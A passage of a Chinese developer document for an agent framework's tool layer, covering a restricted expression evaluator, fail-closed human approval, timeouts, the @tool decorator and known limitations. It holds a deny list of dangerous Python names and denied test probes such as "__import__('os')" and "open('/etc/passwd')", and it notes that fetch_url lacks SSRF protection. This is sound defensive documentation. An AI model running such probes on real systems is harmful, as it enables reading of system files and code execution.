format hash hex int isinstance len list max min oct ord pow range repr reversed round set slice
sorted str sum tuple zip`。
**黑名单名字**（`FORBIDDEN_NAMES`，单独列一份只为让报错更明确）：
`__import__ eval exec compile open globals locals getattr setattr delattr vars input breakpoint
memoryview object type super`。
`Name` 节点要么在 `ALLOWED_BUILTINS` 里，要么在传入的 `variables` 字典里——这是 v1 注释与参数
直接冲突的地方，v2 已按"两者任一"冻结。

**静态复杂度闸**（因为 `timeout_s` 无法中断求值，复杂度**必须**在静态检查阶段拦截）：

| 闸门 | 常量 | 拦截对象 |
|---|---|---|
| `MAX_POW_EXPONENT = 1000.0` | `**` 的 `|指数|` 上限；指数必须是**字面量**（否则无法静态定界） |
| `MAX_RANGE_ARG = 1e6` | `range(n)` 的字面量参数上限（防内存炸弹） |
| `MAX_EXPRESSION_CHARS = 2000` | 表达式字符数上限 |
| `MAX_AST_DEPTH = 32` | AST 嵌套深度上限 |

`pow()` 函数调用也走同一套上界（规范只点名 `Pow` 节点，这里是同精神的延伸）。

**实测（`offline-verified`）**：

```text
'1+1'                -> 2
'2**10'              -> 1024
"'a'*3"              -> 'aaa'
'sum([1,2,3])'       -> 6
'x + 1'  (x=41)      -> 42

'10**10**10'         -> DENY: exponent 1e+10 exceeds the limit 1000
'list(range(10**7))' -> DENY: range() argument 1e+07 exceeds the limit 1e+06
'pow(2, 5000)'       -> DENY: pow() exponent 5000 exceeds the limit 1000
"__import__('os')"   -> DENY: call to '__import__' is forbidden
"open('/etc/passwd')"-> DENY: call to 'open' is forbidden
'lambda x: x'        -> DENY: node type Lambda is not allowed
"f'{1}'"             -> DENY: node type JoinedStr is not allowed
'[x for x in range(3)]' -> DENY: node type ListComp is not allowed
```

全部 DENY 都抛 `ToolExecutionError(retryable=False)`（表达式非法是**永久**错误，重试没有意义）。

**边界声明（话术统一）**：
> `python_eval` 的定位是"**受限表达式求值（非安全沙箱）**"。它不是安全边界——
> 资源耗尽、未来 Python 版本新增 AST 节点遗漏、以及 `Attribute` 白名单里任何一处疏漏都会破。
> 需要真隔离时用 `python_exec`（子进程）或干脆换容器。
> 另外 `timeout_s` 只保证**调用方不再等待**，不保证中断求值——所以复杂度才必须在静态检查阶段拦截。
> 这三句话原文写在 `safe_eval_ast` 的 docstring 里。

### 4.4 工具审批（Human-in-the-loop）：`fail-closed`

**接口**：`ToolSpec.requires_approval`（工具侧声明）+ `ExecutorConfig.approval_policy`
（调用侧提供策略，签名同步的 `policy(call, tool) -> bool`）。流程在
`ToolExecutor._approve`（`tools/executor.py`，§7.4.1 步骤 4.5）。

**核心不变量——fail-closed**：

> `requires_approval=True` 且 `approval_policy is None` 时**一律拒绝**。
> "没有审批人"绝不等于"审批通过"。

**实测（`offline-verified`）**，同一个 `@tool(requires_approval=True)` 工具：

| 配置 | `ok` | `error_type` | `error` |
|---|:--:|---|---|
| 无 policy | **False** | `ToolApprovalDeniedError` | `this tool requires human approval` |
| `policy = lambda call, tool: False` | **False** | `ToolApprovalDeniedError` | `this tool requires human approval` |
| `policy = lambda call, tool: True` | True | — | （正常执行） |

**三个容易漏的工程细节（面试加分点）**：

1. **审批策略抛异常也是拒绝**（fail-closed）：策略自身故障 → 返回失败结果并把原因回灌，
   而不是"异常冒泡＝放行"。
2. **async 策略会被 `await`**：冻结签名是同步的，但真实项目里审批回调经常是 async 的。
   若不 `await` 就直接 `bool(coro)`，**协程对象恒为真值** → "默认放行"——这是最危险的一种静默失效。
   实现里显式 `if inspect.isawaitable(verdict): verdict = await verdict`。
3. **`AgentAbortedError` 走取消路径**：用户主动中止是一次**控制流事件**，转成
   `asyncio.CancelledError`（由 Agent 转 `ABORTED`），而不是返回一个"失败结果"。

**哪些工具带 `requires_approval`**：`run_shell`、`python_exec`（两者都是 `dangerous=True` 的
任意命令/代码执行）。`write_file` / `delete_file` / `run_tests` 标了 `dangerous=True` 但
**没有**要求审批——它们靠 `confirm=True`（delete）、沙箱（write）与 `allow_*` 门控把关。
**这是一个可配置的取舍**：想要更严，把 `ExecutorConfig.approval_policy` 设成
"对所有 `spec.dangerous` 为真的工具都问一次"即可（策略拿到的是完整的 `tool` 对象）。

### 4.5 超时、熔断与 `orphan_thread`：承认线程不可中断

**超时解析**（`_resolve_timeout`，冻结优先级）：在
`[调用参数 timeout_s, call.metadata["timeout_s"], tool.spec.timeout_s, config.default_timeout_s]`
里取**最小有效值**；`timeout_s == NO_TIMEOUT`（-1.0）或 `config.default_timeout_s is None` → 不设超时。
`NO_TIMEOUT` 哨兵之所以必要：`None` 已经被"未指定"占用，v1 的超时链里**没有任何值能表达"不超时"**。

**`orphan_thread`——本文档最能体现"诚实工程"的一点**：

> `asyncio.wait_for` **无法中断** worker 线程里正在跑的同步代码。超时后线程**仍在跑**。
> liteagent 的选择是：**标记它，而不是假装它停了。**

实测（`offline-verified`）：一个 `@tool(timeout_s=1.0)` 的同步工具内部 `time.sleep(3.0)`：

```text
elapsed 1.03s   ok: False   err: ToolTimeoutError
metadata: {'feedback_kind': 'infrastructure', 'orphan_thread': True, 'attempts': 1}
```

超时判定只认 `asyncio.TimeoutError`（`asyncio.TimeoutError is not builtins.TimeoutError`，
3.10 的实测结论）。对**同步**工具，超时后额外做两件事：
1. 设 `metadata["orphan_thread"] = True`；
2. **不重试**（§3.4 的 v2 例外）。理由：重试会**再起一个线程**，对 `write_file` / `run_shell`
   这类工具意味着"两个线程同时写同一份资源" → 数据破坏。
   规则：`if isinstance(exc, ToolTimeoutError) and not tool.spec.is_async: 不重试`。
   **异步**工具的 `ToolTimeoutError` 允许重试。

**注意 `run_shell` / `python_exec` / `run_tests` 的超时走的是另一条路**：它们用
`subprocess.run(timeout=...)`，Python 会**真的杀掉子进程**并抛 `subprocess.TimeoutExpired`，
被工具转成 `ToolTimeoutError` 从**工具函数内部**抛出（不是 executor 的 `wait_for` 触发），
因此结果里**没有** `orphan_thread`。实测 `run_shell({"command": "sleep 2", "timeout_s": 0.5})`：
`err=ToolTimeoutError`、`metadata={'feedback_kind': 'infrastructure', 'attempts': 1, 'approved': True}`
——`orphan_thread` 确实不在。**"谁杀的进程"决定了有没有 `orphan_thread`**，这是个很好的面试细节。

**熔断（circuit breaker）**：`ExecutorConfig.disable_tool_after_failures`
（默认 `DEFAULT_TOOL_FAILURE_LIMIT = 3`，0 = 关闭）。同名工具连续 N 次 **infrastructure** 失败后，
executor 不再调用它，直接返回 `ToolSkippedError` 风格的失败结果。
（计数用 `threading.Lock` 保护：同步工具会跨线程跑，而 delegate 类工具会在自己的线程里再起一个 loop
调同一个 executor——loop-bound 的 `asyncio.Lock` 在这里完全不串行。）

**并发与顺序**：`ExecutorConfig.max_concurrency` 默认 4；`execute_many` 用 `asyncio.gather` **保持
结果顺序与输入顺序一致**，且**永不抛**（失败的调用在结果里带 `ok=False`）。
`sequential_tools` 里的工具（如 `run_shell`）跨调用互斥。顺序写死：**先并发信号量、后 seq 锁**
（反序会在 N 个占满信号量的调用者之间形成死锁）。

---

## 5. 自定义工具指南：`@tool` 装饰器

### 5.1 从函数到 `Tool`：三样东西被自动推导

`@tool` 把普通函数反射成 `Tool` 对象（`ToolSpec` + 原始函数）。**自动推导三样**：

| 推导项 | 来源 | 规则 |
|---|---|---|
| `name` | 函数名（可用 `name=` 覆盖） | |
| `description` | **docstring summary**（可用 `description=` 覆盖） | 取 `inspect.getdoc` → `dedent` → 到**第一个空行**为止，行间用单空格拼接、压缩连续空白 |
| `parameters`（JSON Schema） | **type hints**（可用 `parameters=` 显式接管） | 见 §5.3 映射表 |

**逐参描述**的优先级（冻结）：`Annotated[..., Param(description=...)]` > `docstring` 的 `Args:` 段 >
无（不写 `description` 键）。docstring 风格 `"auto"`/`"google"` 认 `Args|Arguments|Parameters|参数:`
标题行；`"sphinx"` 认 `:param x:`；`"none"` 只取 summary。
**限制（写在此处，因为 `INTERFACES.md` §7.1.2 点名要求 `TOOLS.md` 说明）**：
**嵌套 dataclass 的字段描述不会去解析其 docstring 的 `Args:` 段**——Google 风格里嵌套类型的
docstring 结构不可靠，解析会引入歧义。想让嵌套字段有描述，请用
`Annotated[..., Param(description=...)]`。

### 5.2 全部可用选项

```python
@tool                       # 裸用法：@tool
@tool(**kwargs)             # 带参用法：@tool(name=..., tags=(...))
def f(...) -> ...: ...
```

| kwarg | 默认 | 作用 |
|---|---|---|
| `name` | 函数名 | 工具名（模型可见） |
| `description` | docstring summary | 工具描述（模型可见） |
| `parameters` | 反射生成 | 显式接管 JSON Schema（跳过反射） |
| `tags` | `()` | 分组/筛选标签 |
| `dangerous` | `False` | 只影响 `list(include_dangerous=)` 展示过滤 |
| `requires_approval` | `False` | 触发 HITL 审批（fail-closed） |
| `idempotent` | `True` | `False` 时**默认不重试** |
| `timeout_s` | `None` | `None` 继承配置；`NO_TIMEOUT`(-1.0) 显式不限时 |
| `max_retries` | `None` | 额外尝试次数（总尝试 = 1 + max_retries） |
| `auto_register` | **`False`** | 见下 |
| `docstring_style` | `"auto"` | `auto` / `google` / `sphinx` / `none` |

**`auto_register` 的冻结语义**（D-03，面试亮点）：

- `auto_register=True` == `get_default_registry().register(t, override=False)`；
  重名 → **抛 `ToolDefinitionError`**（**不静默覆盖**——覆盖会让"我装饰了同名工具但生效的是别人那个"
  变成只在运行期才暴露的悬案）。
- `auto_register=False`（**默认**）**不触碰任何全局状态**。
  **为什么不默认自动注册**：`import` 一个模块不该产生副作用。默认注册会让
  "我只是想看某个工具类"变成"它悄悄进了全局注册表"，也让测试之间互相污染。
  显式注册（`registry.register(t)` 或 `register_all(...)`）是一行代码的事，但把控制权留在调用方。

### 5.3 type hints → JSON Schema 的映射（节选，完整表见 `INTERFACES.md` §7.1.1）

| Python 注解 | JSON Schema |
|---|---|
| `str` / `int` / `float` / `bool` | `{"type": "string"/"integer"/"number"/"boolean"}` |
| `Literal["a","b"]` | `{"enum": ["a","b"], "type": "string"}` |
| `Literal["a", 1]`（混型） | `{"enum": ["a", 1]}`（省略 type） |
| `list[X]` / `set[X]` / `tuple[X, ...]` | `{"type": "array", "items": <X>}`（`set` 加 `uniqueItems`） |
| `dict[str, X]` | `{"type": "object", "additionalProperties": <X>}` |
| `Optional[X]` | `<X>`，且**不进入 required** |
| `Annotated[X, Param(...)]` | `<X>` + 约束增强（见 §5.4） |
| 嵌套 `@dataclass` | 递归对象 schema（含环检测与深度上限） |

**两个必须知道的取舍**：

1. **`Optional[X]` 不生成 `"type": ["X","null"]`**（D-05）。OpenAI 与 Anthropic 的 function calling
   对联合类型支持不一致，很多兼容端（vLLM/Ollama 的 JSON-schema-to-grammar）会直接报错。
   做法是"`Optional` 只表达**非必填**，不表达**可为 null**"。
2. **函数签名的 Python 默认值不会进 schema 的 `default` 键**。`def f(x: int = 5)` 的结果是
   "`x` 不在 `required` 里，但 `properties.x` **没有** `default`"。想让 schema 里出现 `default`，
   用 `Annotated[int, Param(default=5)]`。**我是实测确认这一点的**（见 §5.5 的验证输出：
   `limit: Annotated[int, Param(description=..., ge=1)] = 5` 的 schema 里 `limit` 只有
   `description` + `minimum`，没有 `default`）。

**`required` 的判定公式**（§7.1.5 冻结，`*args` 永不 required，`**kwargs` 直接抛
`ToolDefinitionError`）：

```python
metas = getattr(annotation, "__metadata__", ())    # M-1：3.10 上 isinstance(x, Annotated) 恒 False
required = (
    param.default is inspect.Parameter.empty
    and not is_optional(annotation)
    and not any(_meta_default(m) is not _UNSET for m in metas)
)
```

> 顺带一个**实测过的 3.10 坑**（D-19）：`isinstance(Annotated[int, "x"], Annotated)` 在 3.10 **恒为 False**。
> 所以框架里**没有**任何 `isinstance(..., Annotated)`，一律用 `getattr(annotation, "__metadata__", ())`。
> 用 `isinstance` 判断会让 `Annotated` 的元数据**静默失效**——不报错，只是不生效，最难查。

### 5.4 `Param` 与 `Annotated`

`Param` 是框架自带的**零依赖**结构化参数元数据（不 import pydantic）：

```python
@dataclass(frozen=True)
class Param:
    description: str | None = None
    default: Any = _UNSET      # 设置了 => 该参数视为可选，且 schema 出现 "default"
    ge: float | None = None    # -> minimum
    le: float | None = None    # -> maximum
    gt: float | None = None    # -> exclusiveMinimum
    lt: float | None = None    # -> exclusiveMaximum
    min_length: int | None = None   # str -> minLength, list -> minItems
    max_length: int | None = None   # str -> maxLength, list -> maxItems
    pattern: str | None = None      # -> pattern
    examples: tuple[Any, ...] = ()  # -> examples
    enum: tuple[Any, ...] | None = None  # 覆盖 -> enum
    title: str | None = None        # **会被丢弃**，仅为 API 完整性保留
```

用法：`def f(x: Annotated[int, Param(description="数量", ge=0)] = 1) -> None: ...`

识别顺序（对 `__metadata__` 里每个 meta）：`isinstance(meta, Param)` → 直接用；
**鸭子类型**识别 pydantic `FieldInfo`（`hasattr(meta,"description") and hasattr(meta,"default")`
且 `type(meta).__module__.startswith("pydantic")`，**绝不 import pydantic**）；
`isinstance(meta, str)` → 当作 description（`Annotated[int, "count of items"]` 这种写法很常见）；
其它对象忽略并记 warning。

**`Param.title` 被明确丢弃**：JSON Schema 的 `title` 会被部分 provider 拼进 tool 描述里，对模型是纯噪声。

### 5.5 一段真跑得起来的完整代码

下面这段我**在本机跑过**，输出贴在后面（`offline-verified`）。它同时覆盖
docstring→description、type hints→schema、`Param`、`Literal`、`Annotated`、注册、executor 调用、
校验失败、以及 `auto_register`。

```python
from __future__ import annotations

import asyncio
import json
from typing import Annotated, Literal

from liteagent.tools import (ToolExecutor, ToolRegistry, get_default_registry,
                             reset_default_registry, tool)
from liteagent.tools.schema import Param
from liteagent.types import ToolCall


@tool(tags=("demo",), idempotent=True)
def word_count(
    text: str,
    limit: Annotated[int, Param(description="count limit", ge=1)] = 5,
    mode: Literal["chars", "words"] = "words",
) -> str:
    """Count things in a piece of text.

    Args:
        text: The text to inspect.
        limit: Return at most this many items.
        mode: Either count words or characters.
    """
    items = text.split() if mode == "words" else list(text)
    return f"{mode}={len(items)} first={items[:limit]}"


# 1) 直接调用原始函数（@tool 返回的是 Tool，pass_style="kwargs" -> 用关键字参数）
assert word_count.raw(text="hi there", mode="chars", limit=3) == "chars=8 first=['h', 'i', ' ']"

# 2) 注册 + 经 executor 调用（这一层才有校验 / 重试 / 超时 / 审批）
registry = ToolRegistry()
registry.register(word_count)
executor = ToolExecutor(registry)


async def main() -> None:
    ok = await executor.execute(
        ToolCall(id="c1", name="word_count", arguments={"text": "a b c", "mode": "words"})
    )
    assert ok.ok and ok.content == "words=3 first=['a', 'b', 'c']"

    # 校验失败：limit=0 违反 Param(ge=1)
    bad = await executor.execute(
        ToolCall(id="c2", name="word_count", arguments={"text": "x", "limit": 0})
    )
    assert not bad.ok and bad.error_type == "ToolValidationError"


asyncio.run(main())

# 3) auto_register=True 显式写进全局注册表（默认是 False，不碰全局状态）
reset_default_registry()


@tool(auto_register=True, name="auto_demo")
def auto_demo(x: int) -> str:
    """Auto registered demo."""
    return str(x)


assert "auto_demo" in get_default_registry().names()
reset_default_registry()

print(json.dumps(word_count.spec.parameters, ensure_ascii=False, indent=2))
```

**真实输出（抄自终端）**：

```json
{
  "type": "object",
  "properties": {
    "text":  {"type": "string",  "description": "The text to inspect."},
    "limit": {"type": "integer", "description": "count limit", "minimum": 1},
    "mode":  {"type": "string",  "enum": ["chars", "words"],
              "description": "Either count words or characters."}
  },
  "required": ["text"],
  "additionalProperties": false
}
```

以及校验失败时的真实回灌文案：

```text
ok=False  error_type=ToolValidationError
error='invalid arguments for tool: tool_name='word_count',
       errors=['$.limit: 0 is less than the minimum 1']
       fix the arguments to match the tool's JSON schema and call this tool again,
       or pick one of the available tools'
```

**几个从这段代码里能直接观察到的行为（都已在上面验证过）**：

1. `description` = docstring 的第一段（到第一个空行）→ `"Count things in a piece of text."`；
   `Args:` 段**没有**被并进工具描述，而是**逐参**分发到 `limit` / `mode` 的 `description` 里。
2. `limit` 的 `description` 来自 **`Param(description=...)` 而不是 docstring**——优先级生效了
   （docstring 里写的是 "Return at most this many items."，schema 里是 "count limit"）。
3. `limit` 有 Python 默认值 `5` + `Param(ge=1)`，所以它**不在 required**、schema 里有 `minimum`、
   **但没有 `default`**（Python 默认值不映射进 schema，见 §5.3 第 2 点）。
4. `Literal["chars","words"]` → `enum` + `type: "string"`。
5. `word_count.raw(...)` 对 `@tool` 函数是 **`kwargs` 风格**（`raw(text=..., mode=...)`），
   而 `make_function_tool` 造的工具是 **`mapping` 风格**（`func(args_dict)`）。
   这个差别是 `ToolSpec.pass_style` 决定的，传错风格会得到 `AttributeError: 'dict' object has no attribute ...`
   ——**我踩过**，所以写在这里。

### 5.6 `make_function_tool`：运行时造工具

```python
make_function_tool(*, name, description, parameters=None, func, is_async=False,
                   tags=(), dangerous=False, requires_approval=False,
                   idempotent=True, timeout_s=None, max_retries=None) -> Tool
```

与 `@tool` 的关键差别：这里 `func` 的签名永远是 `(args: dict)`（`pass_style` 固定 `"mapping"`），
**没有签名可反射**。所以 `parameters` 缺省时**不能**去反射它（那会产出 `{"properties": {"args": ...}}`
这种把模型引到沟里的 schema）；缺省值是一个"接受任意对象"的宽松 schema
（`{"type":"object","properties":{},"additionalProperties":true}`）**并记一条 warning**
（红线：宽松不是错，静默的宽松才是）。内置工具全部走这条路径，用**手写 schema** 保证
"模型可见的签名"与"模块级纯实现的签名"逐字一致。

---

## 6. 三级降级表：可选依赖缺失时的行为

**红线：降级不得静默。** 每一档降级都会在 `warnings` / 日志 / 返回文本里留下痕迹。
下表的行为描述来自**读实现**（`NUMPY_AVAILABLE` / `RICH_AVAILABLE` / `REQUESTS_AVAILABLE` /
`HTTPX_AVAILABLE` 四个开关），**本机这四个包都装了**，所以**降级分支本身是 `code-only-not-run`**。
我实际验证的只有"四个包都存在时的选路"这一列。

| 可选依赖 | 谁在用 | 缺失时的行为 | 状态 |
|---|---|---|---|
| **numpy** | `memory/embeddings.py`、`memory/vector.py` | 余弦相似度走纯 Python 实现（`_cosine_impl` 的 else 分支），**结果在浮点误差内与 numpy 路径一致**。`NumpyHashingEmbedder` 类**根本不定义** → 想用它得显式传，而 `default_embedder()` **永远返回 `HashingEmbedder`**（不依赖 numpy，保证跨实现者行为一致）。`VectorMemory` 的 `use_numpy` 配置项会与实际能力取与（`bool(self.config.use_numpy and NUMPY_AVAILABLE)`），并在快照里如实报告。 | `code-only-not-run` |
| **rich** | `agent/callbacks.py`（`RichCallback`）、`cli.py`（彩色输出） | `RichCallback` 退化为 `print`；`use_rich=False`（`__repr__` 里可见）。CLI 只有在 `RICH_AVAILABLE and sys.stdout.isatty()` 时才上色。**两种环境都必须能 import 与运行**（冻结）。注意：**`tools list` 的表格从来不用 rich**——它是手写的定宽表格，为了输出能被 `grep`/`diff` 稳定消费。 | `code-only-not-run` |
| **requests** | `llm/transport.py` | `default_transport()` 优先级 **httpx → requests → urllib**，逐档降级并在构造失败时记 `warnings`（例如 httpx 装了但底层 SSL 后端缺失）。`UrllibTransport` 是**唯一必须实现的传输层**（纯 stdlib，永远可用）。影响 **`fetch_url` / `web_search` / 所有 LLM provider**：它们都走 `Transport` 抽象，换后端对工具层透明。 | `code-only-not-run` |
| **httpx** | 同上 | 同上（它是优先级最高的一档，缺了直接落到 requests / urllib）。 | `code-only-not-run` |

**一句话总结**：**内核零三方依赖**——去掉这四个包，框架仍能 import、能跑、能测，
只是少了 numpy 的向量加速、rich 的彩色输出、requests/httpx 的 HTTP 后端（退到 urllib）。
`HashingEmbedder` 与 `UrllibTransport` 就是为此存在的两条"永远可用"的底线实现。

---

## 7. 已知限制与未验证清单（面试时主动交代）

**明确的未实现 / 非目标**（`not-implemented`）：

1. **`fetch_url` 不做 SSRF 防护**：不拦内网 IP、`localhost`、云元数据地址（169.254.169.254）。
   它只过滤"非 http/https"。生产接入需要在外层加白名单/网络策略。
2. **`PathSandbox` 不防硬链接逃逸与 symlink TOCTOU**（见 §4.1 边界声明）。
3. **`run_shell` 的拒绝列表不是安全边界**（见 §4.2 边界声明）；`python_eval` 不是安全沙箱（§4.3）。
4. **`python_exec` 的代码内容没有任何静态检查**——它是"任意代码执行工具"，把关靠审批。
5. **同步工具超时后线程不可中断**（`orphan_thread`）——已标记、已不重试，但**无法杀死**（§4.5）。
6. **`search_files` 的 `glob` 只支持两种形态**（`**/*` 与 `*`），不做完整 glob 引擎。
7. **嵌套 dataclass 的字段描述不解析嵌套 docstring**（§5.1 限制）。

**本文档中我没有在运行期复现的部分**（`code-only-not-run`，逐条列出以免误读）：

- §6 三级降级表的**降级分支**（四个可选依赖在本机都装了；我只验证了"都存在时的选路"）；
- §2.10 里 `web_search` / `fetch_url` 的 `max_retries` **实际触发路径**（默认实现会把后端异常
  转成字符串，所以重试需要注入会抛 `retryable=True` 异常的自定义 backend/transport 才会发生）；
- §2.9 `run_tests` 的 **WARNING 触发路径**（没有在一次测试运行里验证它真的打印出来）；
- §4.5 的**熔断**行为（连续 N 次 infrastructure 失败后拒跑）——读了实现，没跑触发；
- §2.10/§2.11 里依赖真实网络的**成功路径**（本机无外网，真实调用必然失败；测试用注入 `transport` 走离线路径）。

**已删掉/不写的**：本文档不重复 `INTERFACES.md` 的完整注解映射表（只给节选 + 指路），
不重复 `DESIGN_DECISIONS.md` 的决策论证（只引用编号）。

---

## 8. 附录：开发时最常用的几条命令

```bash
# 全部工具（含危险）
python3 -m liteagent tools list --include-dangerous

# 只看某个组
python3 -m liteagent tools list --include-dangerous --tools code

# 一个工具的完整 schema（两种 provider 格式）
python3 -m liteagent tools schema run_shell --format openai
python3 -m liteagent tools schema run_shell --format anthropic

# 导出当前配置下所有工具的 schema 到文件（实测导出 13 个，含危险工具）
python3 -m liteagent tools schema -o /tmp/tools.json

# 零工具 / 只有 config 里声明的工具（config 文件必须存在）
python3 -m liteagent tools list --no-tools
python3 -m liteagent tools list --no-builtin --config app.json

# 打开 shell（默认关闭）；沙箱根默认取 LITEAGENT_SANDBOX_ROOT，再退到 cwd
LITEAGENT_ALLOW_SHELL=1 python3 -m liteagent tools list --allow-shell

# 关掉联网
python3 -m liteagent tools list --no-network
```
